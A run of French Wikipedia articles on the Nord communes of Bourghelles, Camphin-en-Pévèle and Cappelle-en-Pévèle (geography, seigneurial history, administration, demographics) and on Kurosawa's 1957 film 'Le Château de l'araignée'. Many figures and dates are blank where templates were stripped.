Le tableau ci-dessous présente la typologie des logements à Bourghelles en 2019 en comparaison avec celle du Nord et de la France entière. Une caractéristique marquante du parc de logements est ainsi une proportion de résidences secondaires et logements occasionnels (0,1 %) inférieure à celle du département (1,6 %) mais supérieure à celle de la France entière (9,7 %). Concernant le statut d'occupation de ces logements, 86 % des habitants de la commune sont propriétaires de leur logement (83,9 % en 2014), contre 54,7 % pour le Nord et 57,5 pour la France entière.
Toponymie.
La localité est attestée en 1197 sous le nom de "Borghela". Ce terme, dérivant du bas latin "Burgus", provenant lui-même du germanique "Burg", désigne une petite forteresse
Histoire.
Ancien Régime.
Avant la Révolution française, Bourghelles est divisé entre la châtellenie de Lille et les États du Tournaisis. Le village est le siège de plusieurs seigneuries.
Le nom de certains seigneurs de Bourghelles est connu :
Gilbert de Bourghelles, seigneur de Quiquempois
Alard de Bourghelles.
Charles d'Hovyne (1596-1671), homme d'État des Pays-Bas méridionaux, seigneur de Bourghelles.
Philippe-Ignace-François de Gottignies, seigneur de Vandenbroeke, détient la terre de Bourghelles avant 1698.
Au , François-Eustache Taviel du Moulinel, chevalier, est seigneur du Moulinel, de Bois-Grenier, de Bourghelles. Le , il est créé substitut du procureur du roi et le reste jusqu'en 1724. Il épouse Catherine de la Haye, fille de Pierre de la Haye et de Charlotte de Lobel.
Robert Huvino II (1653-1740) est seigneur de Bourghelles, Inchy-en-Artois, Villers (sans doute Villers-lès-Cagnicourt), Cagnicourt, Meurchin. Il est le fils de Robert Huvino , bourgeois de Lille, et d'Adrienne Brœucq. Il est baptisé à Lille le et meurt à Lille le , à l'âge de 87 ans, inhumé le lendemain dans l'église Sainte-Catherine de Lille. Anobli le par l'achat d'une charge de conseiller secrétaire du roi en la grande chancellerie de France qui lui coûta 57 000 livres, il acquiert la bourgeoisie de Lille le , devient sous-doyen de la grande chancellerie de Flandre. Il a acheté le à Philippe-Ignace-François de Gottignies la terre de Bourghelles pour le prix principal de 66 500 florins. Il acquiert la seigneurie d'Inchy-en-Artois en vertu d'un décret de la Cour du Parlement de Paris, en 1702, sur Philippe de Croÿ-Chimay d'Arenberg, prince de Chimay, alors décédé et Maximilienne de Grave son épouse. Elle ne forme qu'un seul fief avec les seigneuries de Cagnicourt et de Villers, en vertu de lettres patentes du , mais elle en est séparée en application du partage fait le entre les fils de Robert Huvino. Il épouse à Lille le Marie-Angélique Le Comte (1672-1720), fille de François-Daniel, écuyer, seigneur du Bus et de Catherine Grau. Marie-Angélique nait le et meurt le , inhumée dans l'église Sainte-Catherine de Lille.
Pierre-Robert-Martin Huvino (1698-1775), écuyer, est seigneur de Bourghelles, Inchy-en-Artois, Cagnicourt, Villers, Meurchin. Fils de Robert II, il est baptisé à Lille le , devient bourgeois de Lille le , gentilhomme ordinaire du roi, rewart (chargé de la police) de Lille. Il meurt le , à 76 ans, est enterré dans le chœur de l'église de Bourghelles. Il se marie à Lille le avec Marie-Madeleine-Julie de Montmonnier (1717-1741), fille de François-Alexandre, écuyer, capitaine grand bailli de La Motte au Bois, et de Marie-Robertine de Surmont. Née en 1717, elle meurt à Lille le . Il épouse ensuite à Lille le , Angélique-Caroline-Joseph Frans (1720-1790) (elle a 22 ans, il a 44 ans), fille d'Alexis-François , seigneur de la Hamayde, bourgeois de Lille, conseiller procureur du roi à la Monnaie de Lille, et de Marie-Françoise de Rogier. La seconde épouse est baptisée à Lille le et meurt le , à 69 ans.
Louis-Jean-Baptiste-Joseph Huvino (1743-1838), fils de Pierre-Robert-Martin et d'Angélique-Caroline-Joseph Frans, nait à Lille en juin 1743 (baptisé le ). Il est écuyer, seigneur de Bourghelles, bourgeois de Lille le , échevin de la ville. Le , vivant de son bien et résidant à Bourghelles (certificat de résidence établi par les autorités), craignant pour sa vie, il se réfugie à Buigny-l'Abbé et revient à Bourghelles le . Ne se sentant pas en sécurité, il émigre en l'an V (1796-1797) et va vivre à Munster. Il est rayé de la liste des émigrés et amnistié le (22 fructidor an X). Il meurt à Lille le , à l'âge de 92 ans. Il épouse à Lille le Albertine-Élisabeth-Désirée-Joseph d'Hennin (1752-1801), fille d'André, écuyer, seigneur du Souverain Pire, et de Marie-Élisabeth de Bourgogne. Elle nait à Lille en octobre 1752 (baptisée le ) et meurt à Tournai le 7 brumaire an X ().
Pierre-Louis-Marie Huvino (1771-1857), fils de Louis-Jean-Baptiste-Joseph, nait à Lille en septembre 1771 (baptisé le ). Il est écuyer, seigneur de Bourghelles, émigré avec son père et amnistié en même temps que lui. Il se montre ardent bonapartiste puis royaliste zélé. il est adjoint au maire de Lille du au , puis du au . De nouveau nommé conseiller municipal de Lille par ordonnance royale du , il démissionne lors de la Révolution de 1830. Il meurt célibataire à Bourghelles le , à l'âge de 86 ans.
Époque contemporaine.
Entre 1896 et 1932, Bourghelles est desservie par le tramway à vapeur des Chemins de fer économiques du Nord qui circule est en accotement de la nationale 355 sur la ligne de Saint-Amand à Hellemmes, longue de .
Politique et administration.
Rattachements administratifs et électoraux.
Rattachements administratifs.
La commune se trouve dans l'arrondissement de Lille du département du Nord.
Elle faisait partie depuis 1818 du canton de Cysoing. Dans le cadre du redécoupage cantonal de 2014 en France, cette circonscription administrative territoriale a disparu, et le canton n'est plus qu'une circonscription électorale.
Rattachements électoraux.
Pour les élections départementales, la commune fait partie depuis 2014 du canton de Templeuve-en-Pévèle
Pour l'élection des députés, elle fait partie de la sixième circonscription du Nord.
Intercommunalité.
Bourghelles était membre de la communauté de communes du Pays de Pévèle, un établissement public de coopération intercommunale (EPCI) à fiscalité propre créé fin 1993 et auquel la commune avait transféré un certain nombre de ses compétences, dans les conditions déterminées par le code général des collectivités territoriales.
Conformément aux prescriptions de la loi de réforme des collectivités territoriales du 16 décembre 2010, qui a prévu le renforcement et la simplification des intercommunalités et la constitution de structures intercommunales de grande taille, cette intercommunalité a fusionné avec sa voisine pour former, le , la communauté de communes Pévèle Carembault dont est désormais membre la commune.
Liste des maires.
Maire en 1881: Floutry.
Équipements et services publics.
Enseignement.
Bourghelles relève de l'académie de Lille.
Elle possède une école primaire publique : l'école des valettes
Justice, sécurité, secours et défense.
La commune relève du tribunal d'instance de Lille, du tribunal de grande instance de Lille, de la cour d'appel de Douai, du tribunal pour enfants de Lille, du tribunal de commerce de Tourcoing, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 34,9 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 22,6 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,03 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Culture et patrimoine.
Géants du Nord.
Le bourg s'est doté d'un géant du Nord, inauguré le et qui porte le nom de Gilbert de Bourghelles.

</doc>
<doc id="191988" url="https://fr.wikipedia.org/wiki?curid=191988" title="Camphin-en-Pévèle">
Camphin-en-Pévèle

Camphin-en-Pévèle est une commune française située dans le département du Nord, en région Hauts-de-France.
Géographie.
La commune se situe dans la Pévèle à de Lille.
Pour y venir, il faut sortir à la sortie « Baisieux » de l'autoroute A27 direction Bruxelles.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le ruisseau de Saint-calixte et divers autres petits cours d'eau.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Marque Deûle ». Ce document de planification concerne un territoire de de superficie, délimité par les bassins versants de la Marque et de la Deûle, formant une vaste cuvette sédimentaire de de long et de de large, où la pente est très faible. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est la Métropole européenne de Lille.
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Lesquin à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Camphin-en-Pévèle est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Camphin-en-Pévèle, une unité urbaine monocommunale constituant une ville isolée. Par ailleurs la commune fait partie de l'aire d'attraction de Lille (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de ou plus (hors Paris).
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (73,7 % en 2018), en diminution par rapport à 1990 (78,9 %). La répartition détaillée en 2018 est la suivante : 
terres arables (73 %), zones urbanisées (18,6 %), espaces verts artificialisés, non agricoles (7,7 %), zones agricoles hétérogènes (0,8 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Du latin "Confinium", de "confinis" avec le suffixe "-ium", (« Contigu, voisin »).
Histoire.
Vers le milieu du , Clodion le Chevelu, un chef des Francs saliens, ayant appris que les villes de la province romaine de Belgique seconde étaient sans défense, pénétra avec son armée en territoire romain et s'empara du Cambrésis et de l'Artois méridional. Il aurait conquis et gouverné la ville de Camphin-en-Pévèle en 430. Une plaque signifiant l'emplacement de la voie romaine Tournai-Estaires est visible sur le secteur pavé de la Justice.
Le "Camphaing" fut l'un des sites de la bataille de Bouvines au Carrefour de l'Arbre. Le roi de France, Philippe "Auguste", soutenu par des milices communales, y vainquit une coalition menée par l'empereur Othon et ses alliés, Jean sans Terre et le comte Ferrand de Flandre. Guillaume le Breton, chroniqueur de et auteur de "La Philippide", relate que l'armée française a traversé la rivière Marque pour emprunter le pont de Bouvines situé entre Cysoing et Sainghin-en-Mélantois.
Politique et administration.
Liste des maires.
 
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Lille, du tribunal de grande instance de Lille, de la cour d'appel de Douai, du tribunal pour enfants de Lille, du tribunal de commerce de Tourcoing, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 39,0 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 17,1 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,86 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Culture locale et patrimoine.
Lieux et monuments.
Le domaine de Luchin, aujourd'hui propriété du LOSC, remonte au et fut un temps propriété des comtes de la Hamaide Belgique et de succession en succession, ou de cession, revient aux comtes de Brigode qui furent maire de la commune de Camphin-en-Pévèle de 1815 à 1905.

</doc>
<doc id="191990" url="https://fr.wikipedia.org/wiki?curid=191990" title="Cappelle-en-Pévèle">
Cappelle-en-Pévèle

Cappelle-en-Pévèle est une commune française située dans le département du Nord (59), en région Hauts-de-France. Cette commune rurale se situe dans la Pévèle, région naturelle du Nord de la France. Entourée par les communes de Templeuve-en-Pévèle, Mérignies, Auchy-lez-Orchies, Bersée, Nomain et Pont-à-Marcq, Cappelle-en-Pévèle est située à au sud-est de la ville de Lille.
À Cappelle-en-Pévèle, l'économie est essentiellement axée sur l'agriculture et est implantée sur son territoire l'entreprise agro-alimentaire Florimond Desprez, fondée en 1801 et installé depuis 1830. Elle est leader mondial en semences de betterave, également spécialisée dans la recherche scientifique sur les semences.
Depuis plusieurs années, la commune est sujette à beaucoup d'intérêt de la part de promoteurs immobiliers et donc on assiste à l'apparition de nouveaux lotissements.
De plus, un collège bénéficiant du statut de Haute Qualité Environnementale est en construction et dont l'ouverture est prévue à la rentrée 2010.
Au point de vue des transports, le village est desservi par la ligne de bus 306 Lille-Orchies, et bénéficie de la proximité avec la gare SNCF sur la ligne Lille-Valenciennes et située à Templeuve-en-Pévèle, commune voisine.
Sur le plan culturel, Cappelle-en-Pévèle organise sa traditionnelle fête du village annuelle le premier dimanche de juin avec au programme la braderie et des stands et manifestations organisées par les différentes associations de la commune dans la matinée ; et durant toute l'après-midi, un défilé carnavalesque et folklorique, de même qu'une « Marche des Géants ». L'ambiance festive de cette journée est renforcée par la présence d'une ducasse.
Tous les deux ans, début septembre au château du Béron, se tient la Fête du Goût durant laquelle les commerçants de la Pévèle présentent et vendent leurs produits dans une ambiance festive grâce à la présence d'attractions et de stands mis en place par les associations de la commune.
Le Paris - Roubaix, la mythique course cycliste, emprunte le secteur pavé du bar situé à la limite sud du village entre Cappelle-en-Pévèle et Bersée et qui appartient au long secteur pavé d'Auchy-lez-Orchies à Bersée.
Géographie.
Situation.
Cappelle en Pévèle est un village rural du département du Nord. Selon le recensement de la population en 2011, il accueille 2 208 habitants sur son territoire.
Il est également membre de la communauté de communes Pévèle Carembault et est limitrophe de Templeuve-en-Pévèle, de Mérignies, d'Auchy-lez-Orchies, de Nomain et de Bersée.
Cette commune rurale se trouve dans la Pévèle, région naturelle du Nord de la France. Cappelle-en-Pévèle est à une distance de au Sud-Est de Lille et se situe à 40 mètres d'altitude. Un cours d'eau appelé localement "Le Zécart", affluent de la Marque, traverse le village. La commune est proche du parc naturel régional Scarpe-Escaut à environ .
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le Zecart, la Verneceuille et la Cappelle-en-Pévèle.
Le Zécart, d'une longueur de , prend sa source dans la commune de Bersée et se jette dans la Marque à Templeuve-en-Pévèle, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Marque Deûle ». Ce document de planification concerne un territoire de de superficie, délimité par les bassins versants de la Marque et de la Deûle, formant une vaste cuvette sédimentaire de de long et de de large, où la pente est très faible. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est la Métropole européenne de Lille.
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Lesquin à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Cappelle-en-Pévèle est catégorisée petite ville, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Lille (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de ou plus (hors Paris).
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (89,2 % en 2018), en diminution par rapport à 1990 (93,3 %). La répartition détaillée en 2018 est la suivante : 
terres arables (67,5 %), zones agricoles hétérogènes (15,5 %), zones urbanisées (10,8 %), prairies (6,2 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Organisation du territoire.
Le Centre-Bourg.
On peut limiter le Centre-Bourg de Cappelle-en-Pévèle à la rue du Général-de-Gaulle, la rue principale du village faite de pavés, et à ses rues adjacentes jusqu'à la rue de la Gare au Nord et à l'ancienne ligne de chemin de fer et jusqu'à la rue du Pont-Naplet au Sud et la route départementale qui pose les limites réelles du Centre-Bourg.
On peut retenir les rues suivantes :
Les hameaux et lieux-dits.
L'orientation géographique prend comme point central le Centre de Cappelle-en-Pévèle
Logement.
Voir Logement de la commune sur le site de l'INSEE
Voies de communication et transports.
Accès facile à des voies autoroutières.
Via la route départementale 549 qui traverse le village de Cappelle-en-Pévèle, on peut rejoindre facilement les deux autoroutes suivantes :
Toponymie.
"Capella in Pabula", "Cappelle en Peule".Littéralement "La Chapelle dans les Pâtures".
Histoire.
L'histoire du village peut ainsi se résumer : ce village a fait partie de Templeuve jusqu'en 1229. La chapelle Saint-Nicolas devient ensuite une paroisse autonome : le 9 avril 1229, Walter, (Gauthier de Marvis), évêque de Tournai, érige en paroisse distincte la chapelle Saint-Nicolas de Templeuve, paroisse qui prit depuis le nom de Cappelle-en-Pévèle.
Selon les Annuaires Ravet-Anceau, le hameau de Wastines constituait une seigneurie appartenant, du au , à la famille de Montmorency. Il y avait une tradition, qui consistait à ce que le possesseur du fief des Rosières chantait en guise de droit de relief à la Salle de Lille "La Chanson d'Auderger le Breneux".
Monument remarquable, le château du Béron doit son nom à Jean-Philippe du Béron (1680-1734) Marié avec Bonne de Haynin, qui l'achète en 1719 et le fait rebâtir. Dans sa forme actuelle, il date de 1845. Il sert aujourd'hui aux différents centres de loisirs.
Jean-Philippe du Béron était un haut personnage. Seigneur de Cappelle qu'il a achetée au prince de Robecq le , il est fils de Jean, seigneur de Boularietz, marchand bourgeois et échevin de Lille, grand connétable de la confrérie Sainte-Barbe (confrérie des canonniers et couleuvriniers de Lille, ancêtre du Bataillon des canonniers sédentaires de Lille) et de Françoise de Warenghien. Il est baptisé à Lille La Madeleine le , devient bourgeois de Lille le (ou 1722), est anobli par l'achat d'une charge de conseiller secrétaire du roi, fait partie du magistrat de Lille. Il occupe la fonction de grand bailli des États de Lille, Douai, Orchies (Flandre wallonne), est un temps sénéchal de Saint-Pol, et encore trésorier principal de l'extraordinaire des guerres du département de Flandre. Il meurt le . Ayant eu une fille illégitime d'une liaison avec Marie-Barbe Liébar, il se marie à Lille le ( ou le 8 février) à Lille avec Marie-Madeleine-Joseph de Surmont (1703-1724), fille de François, bourgeois de Lille, anobli par l'achat d'une charge de conseiller secrétaire du roi, et de Marie-Madeleine Van Thiennen. Il épouse ensuite Bonne-Aldegonde-Joseph de Haynin, 1704-1737) fille de Joseph et de Marie-Rose de la Porte, née en 1704, décédée le , s'étant remariée le avec Nicolas-Joseph-Arnould Rasoir, seigneur de Croix.
En mai 1792, après le déclenchement de la Révolution française, les troupes coalisées contre la France envahissent la commune. et y restent jusqu'en octobre, jusqu'à leur échec lors du siège de Lille.
En 1793, une attaque nocturne menée par les Autrichiens contre le bataillon de Saône-et-Loire échoue après un combat sanglant.
Politique et administration.
Liste des maires.
Source : Microfilms numérisés des registres paroissiaux et d'Etat civil de Cappelle en Pévèle.
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Lille, du tribunal de grande instance de Lille, de la cour d'appel de Douai, du tribunal pour enfants de Lille, du tribunal de commerce de Tourcoing, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 37,7 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 19,0 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,76 % d'hommes, largement supérieur au taux départemental (48,23 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Culture et patrimoine.
Patrimoine et manifestations culturelles.
Matin : braderie + stands et manifestations organisées par les différentes associations de la commune
Après-midi : défilé carnavalesque et folklorique et "Marche des Géants" + ducasse
Économie.
Emploi et population active.
Voir Emploi - Population Active de la commune sur le site de l'INSEE
Formes et conditions d'emploi.
Voir Formes et Conditions d'emploi de la commune sur le site de l'INSEE
Diplômes et formation.
Voir Diplômes - Formation de la commune sur le site de l'INSEE
Social.
Infrastructures scolaires.
La commune dispose d'une école appelée "École Émilie Carles" regroupant une école maternelle et une école primaire dans un même établissement sur la place de la Mairie, de même qu'une garderie périscolaire mais aussi d'un collège au nom de Simone Veil.
Famille et situation matrimoniale.
Voir Famille - Situation matrimoniale de la commune sur le site de l'INSEE

</doc>
<doc id="191992" url="https://fr.wikipedia.org/wiki?curid=191992" title="Le Château de l'araignée">
Le Château de l'araignée

 est un film japonais réalisé par Akira Kurosawa, sorti en 1957. Il s'agit d'une adaptation libre de "Macbeth", la pièce de théâtre de William Shakespeare, adaptation dans laquelle l'intrigue a été transposée dans le Japon médiéval du , pendant l'époque Sengoku. Le titre original japonais, qui signifie littéralement « Le château de la toile d'araignée », fait référence à la forêt dense et brumeuse qui entoure le château, symbole du piège dans lequel les protagonistes se trouvent enfermés.
Le film met en scène Toshirō Mifune dans le rôle principal de Washizu, un samouraï ambitieux, et Isuzu Yamada dans celui de son épouse, Asaji. L'intrigue suit fidèlement la trame de la pièce de Shakespeare : après avoir entendu une prophétie d'un esprit de la forêt (qui remplace les trois sorcières de l'œuvre originale), Washizu est poussé par son épouse à assassiner son seigneur pour s'emparer du pouvoir. Cette tragédie explore les thèmes de l'ambition dévorante, de la culpabilité, de la paranoïa et de la folie, tout en les ancrant dans le contexte culturel et historique du Japon médiéval.
Reconnu comme l'une des adaptations les plus originales et influentes de Shakespeare au cinéma, "Le Château de l'araignée" a été acclamé pour sa mise en scène et son atmosphère inquiétante. Kurosawa utilise magistralement les éléments visuels et sonores pour créer un environnement oppressant et surnaturel, notamment à travers l'utilisation de la brume, de la pluie et des forêts denses. Le réalisateur parvient à fusionner habilement les traditions théâtrales occidentales avec des éléments du théâtre nō japonais, créant ainsi une œuvre unique qui transcende les frontières culturelles.
Synopsis.
Dans le Japon féodal du , deux commandants samouraïs, Washizu et Miki, traversent une forêt brumeuse après une victoire militaire. Ils rencontrent un esprit qui prédit leur avenir : Washizu deviendra seigneur de la citadelle du Nord et Miki deviendra commandant de la première forteresse dès ce soir, puis Washizu deviendra seigneur du château de l'araignée, tandis que le fils de Miki lui succédera. Arrivés au château, Washizu et Miki sont félicités par le seigneur du château de l'araignée qui les récompense comme dit dans la première partie de la prédiction. Encouragé par son ambitieuse épouse Asaji qui pousse son époux à accomplir entièrement la prophétie, Washizu assassine le seigneur du château de l'araignée et s'empare du pouvoir. Tourmenté par la culpabilité et la paranoïa, il fait tuer son fidèle allié, Miki, mais échoue à faire tuer le fils. Les ennemis de Washizu se liguent contre lui. Consultant à nouveau l'esprit, il apprend qu'il ne risque rien tant que la forêt ne se mettra pas en marche. Rassuré par cette prédiction qu'il juge irréalisable, il convainc ses hommes de son invincibilité. Lorsque les arbres de la forêt se mettent à avancer vers la forteresse, les soldats de Washizu se retournent contre lui, le transperçant de flèches. Les conditions sont créées pour que le fils de Miki accède au pouvoir. La prédiction initiale est ainsi achevée. 
Production.
Développement.
Les pièces de William Shakespeare sont présentes au Japon depuis la Restauration de Meiji en 1868, bien qu'elles aient été interdites pendant la Seconde Guerre mondiale car non japonaises. Le réalisateur Akira Kurosawa déclare être un admirateur de longue date de "Macbeth" et qu'il envisage de réaliser une adaptation cinématographique après avoir terminé son film de 1950 "Rashōmon". Lorsqu'il apprend qu'Orson Welles a sorti sa propre version de "Macbeth" en 1948, Kurosawa décide de reporter son projet d'adaptation de plusieurs années.
Kurosawa est convaincu que l'Écosse et le Japon au Moyen Âge partagent des problèmes sociaux similaires et que ceux-ci portent des leçons pour le présent. De plus, "Macbeth" peut servir de conte moral complétant son film de 1952 "Vivre".
En mai 1956, Kurosawa annonce qu'il produira trois films de samouraïs pour la Tōhō, "Le Château de l'araignée", "La Forteresse cachée", et "Le Garde du corps", chacun devant être tourné de septembre 1956 à début 1957 par d'autres réalisateurs. Ishirō Honda, surtout connu pour avoir réalisé le "kaiju" de 1954 "Godzilla", est prévu pour réaliser "Le Château de l'araignée", mais Kurosawa finit par réaliser les trois films lui-même.
Le film combine la pièce de Shakespeare avec le style nō, Kurosawa étant un admirateur de ce genre théâtral, qu'il préfère au kabuki. En particulier, il souhaite incorporer les mouvements corporels et la conception des décors de style nō. Le genre utilise également des masques, et l'esprit maléfique est vu, dans différentes parties du film, portant des visages rappelant ces masques, commençant par "yaseonna" (vieille dame). Le nō met souvent l'accent sur la doctrine bouddhiste de l'impermanence. Cela est lié au fait que le personnage de Washizu est privé de salut, et que son fantôme est toujours de ce monde. De plus, l'utilisation de la flûte et du tambour dans la partition du film est tirée du nō.
Écriture.
Les trois collaborateurs fréquents de Kurosawa pour les scénarios collaborent ensemble pour la première fois : Hideo Oguni, Shinobu Hashimoto, et Ryūzō Kikushima, chacun travaillant avec le réalisateur pour la quatrième fois. Initialement, les scénaristes écrivent le scénario avec l'intention qu'il soit réalisé par Ishirō Honda, mais la Tōhō insiste pour que ce soit Kurosawa qui prenne la direction après avoir lu le scénario et réalisé qu'un budget important est nécessaire pour le film.
Le titre japonais du film, "Kumonosu-jō" (蜘蛛巣城), se traduit littéralement par « Le château de la toile d'araignée ». Cette métaphore puissante évoque l'atmosphère étouffante et le destin inéluctable des personnages principaux. La forêt dense et brumeuse qui entoure le château devient un personnage à part entière, symbolisant le piège moral et psychologique dans lequel Washizu et son épouse s'enferment progressivement. Kurosawa utilise cette imagerie de manière récurrente tout au long du film, notamment dans les scènes de la forêt où les personnages semblent littéralement pris au piège dans un labyrinthe de branches et de brume, reflétant leur confusion morale et leur incapacité à échapper à leur destin. Cette interprétation visuelle du titre renforce le thème central de l'œuvre : l'inévitabilité de la chute lorsqu'on cède à l'ambition démesurée.
Tournage.
Le décor extérieur du Château de l'araignée a été monté sur les pentes du mont Fuji, mais les scènes se déroulant dans la cour intérieure ont été tournées dans des studios de la Tōhō, à Tamagawa. Dans un souci de continuité visuelle, l'équipe a rapporté de la terre volcanique pour en recouvrir le sol du studio. Les scènes d'intérieur ont, quant à elles, été tournées dans un plus petit studio de Tokyo. Pour les séquences en forêt, la production s'est déplacée à Aokigahara, et des scènes additionnelles ont été tournées en studio. Enfin, la propriété servant de décor pour le domaine de Washizu a été trouvée dans la péninsule d'Izu.
Concernant le tournage du film, Akira Kurosawa a déclaré : « Le film a été très compliqué à réaliser. Nous avions décidé que le décor du château devait être monté sur les pentes du mont Fuji, non pas parce que je voulais montrer la montagne, mais parce que ses pentes inclinées correspondaient au paysage que je voulais filmer. Et il y a souvent du brouillard à cet endroit. J'avais décidé que je voulais beaucoup de brouillard dans ce film. Construire le décor a été très difficile car nous n'avions pas assez de monde, et aussi parce que nous étions très loin de Tokyo. Par chance, le Corps des Marines avait une base dans les environs et ils ont été d'un grand secours ; une unité de la police militaire nous a également prêté main-forte. Nous avons tous travaillé très dur pour aménager le terrain et monter le décor. Je me rappelle que nous étions littéralement épuisés d'avoir à travailler dans cet endroit plongé dans le brouillard ; nous en étions presque malades. »
Effets spéciaux.
La scène dans laquelle les arbres de la forêt s'approchent du château est créée par le département des effets spéciaux de la Tōhō et dirigée par Eiji Tsuburaya. À l'origine, cette scène était plus longue, mais Kurosawa a coupé plusieurs plans d'arbres au montage parce qu'il n'en était pas impressionné.
La scène de la mort de Washizu, dans laquelle ses propres archers se retournent contre lui et le transpercent de flèches, est en fait réalisée avec de vraies flèches, tirées par des archers compétents et expérimentés. Pendant le tournage, Mifune fait de grands mouvements avec les bras, ce qui est la façon dont l'acteur indique la direction de son son prochain mouvement afin d'empêcher les archers de le toucher accidentellement. L'idée était de renforcer le réalisme des expressions faciales de l'acteur, son personnage étant censé être terrorisé.
Sortie.
